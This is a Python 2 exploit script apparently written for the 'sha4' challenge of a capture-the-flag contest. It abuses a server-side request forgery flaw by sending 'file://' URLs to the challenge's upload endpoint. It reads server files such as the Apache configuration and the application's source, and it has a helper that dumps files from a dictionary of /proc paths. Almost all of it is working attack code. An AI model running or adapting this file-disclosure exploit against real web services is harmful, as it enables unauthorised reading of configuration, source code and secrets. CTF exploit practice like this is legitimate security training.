#!/bin/env python
#-*- encoding: utf-8 -*-

import requests as req
import base64
import re
import sys
import os


def decode_base64(html):
    if 'data:image' in html:
        op = re.search(r'data:image/jpeg;base64, (\S)"$', html)
        if op:
            return op.group(1)
        else:
            return html
    else:
        return html


def get_file(path, ispost=False):
    global url
    if ispost:
        res = req.post(url, data=ispost)
    else:
        res = req.get(url + path)
    html = res.content
    if res.status_code == 200:  # and 'data:image' in html:
        # print res.url
        return html
    else:
        return False


def get_one_file(path, data=False):
    global p
    _data = {}
    if data:
        _data = {
            data: p + path
        }
    html = get_file(path, _data)
    if html:
        # print html
        return html
    else:
        return ''
        # return decode_base64(html)


def save_to_file(file_name, file_data, dic_name):
    print file_name
    with open(file_name, 'a') as f:
        if file_data:
            f.write(dic_name)
            f.write("\n")
            f.write(file_data)
            f.write("\n")
            f.write("\n")


def get_dic(dic):
    c = []
    with open("../dict/" + dic) as f:
        c = f.readlines()
    c = [i.replace('\n', '') for i in c]
    return c


def down_file_by_dict(dic_name, tmp, p=False):
    dics = get_dic(dic_name)
    for dic in dics:
        _dic_name = dic.split("/")
        _dic_name = _dic_name[len(_dic_name) - 1]
        print dic
        save_to_file("./../tmp/" + tmp, get_one_file(dic, p), dic)
        # sys.exit()


def down_one_file(file_name, argv, save_dir):
    save_file = file_name.split("/")[-1]
    if not os.path.exists("/Users/virink/tmp/" + save_dir):
        os.mkdir("/Users/virink/tmp/" + save_dir)
    with open("/Users/virink/tmp/" + save_dir + "/" + save_file, 'w') as f:
        res = get_one_file(file_name, argv)
        print res
        f.write(res)

if __name__ == '__main__':
    url = "http://sha4.chal.pwning.xxx/upload"
    p = 'file://'
    argv = 'url'
    # print get_one_file('/etc/apache2/apache2.conf', "url")
    # print get_one_file('/var/www/sha4/server.py', "url")
    # /var/tmp/comments/%s.file
    print get_one_file("/var/tmp/comments/8a9d7c33b323f0fbb3a82c4b9c157380.file", "url")
    # ###############
    # down_one_file('/var/www/sha4/admin.py', 'url', 'pctf_sha4')
    # down_file_by_dict('ssrf&lfi/proc.dic', 'pctf_sha4_proc.log', argv)
